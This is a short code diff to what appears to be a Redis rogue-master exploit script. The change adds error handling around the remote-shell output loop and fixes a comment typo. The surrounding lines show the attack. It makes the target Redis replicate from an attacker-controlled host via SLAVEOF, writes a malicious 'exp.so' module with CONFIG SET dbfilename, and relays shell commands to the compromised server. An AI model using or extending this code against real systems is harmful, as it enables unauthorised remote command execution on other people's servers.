@@ -110,14 +110,18 @@ def interact(remote):
             if cmd == "exit":
                 return
             r = remote.shell_cmd(cmd)
-            for l in decode_shell_result(r).split("\n"):
-                if l:
-                    print("\033[1;34;40m[>>]\033[0m " + l)
+            try:
+                for l in decode_shell_result(r).split("\n"):
+                    if l:
+                        print("\033[1;34;40m[>>]\033[0m " + l)
+            except AttributeError:
+                pass
+
     except KeyboardInterrupt:
         return
 
 def runserver(rhost, rport, lhost, lport):
-    # expolit
+    # exploit
     remote = Remote(rhost, rport)
     remote.do(f"SLAVEOF {lhost} {lport}")
     remote.do("CONFIG SET dbfilename exp.so")
